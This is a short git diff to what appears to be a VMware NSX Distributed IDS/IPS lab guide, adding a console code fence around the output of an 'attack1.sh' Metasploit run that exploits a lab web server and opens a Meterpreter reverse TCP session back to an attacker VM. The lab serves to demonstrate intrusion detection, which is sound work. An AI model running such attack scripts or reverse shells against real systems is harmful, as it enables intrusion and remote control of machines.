@@ -409,6 +409,8 @@ You have now successfully configured the NSX Distributed IDS/IPS ! In the next e
 
 6. Confirm the vulnerable server was sucessfully exploited and a **Meterpreter** reverse TCP session was established from **App1-WEB-TIER VM** back to the **Extermal VM**
 
+
+```console
 vmware@ubuntu:~$ ./attack1.sh
 
 IIIIII    dTb.dTb        _.---._
@@ -440,5 +442,6 @@ resource (attack1.rc)> exploit
 [*] Sending stage (38288 bytes) to 192.168.10.100
 [*] Meterpreter session 1 opened (10.114.209.151:4444 -> 192.168.10.100:45032) a                        t 2020-07-20 19:37:29 -0500
 
+```
 
 
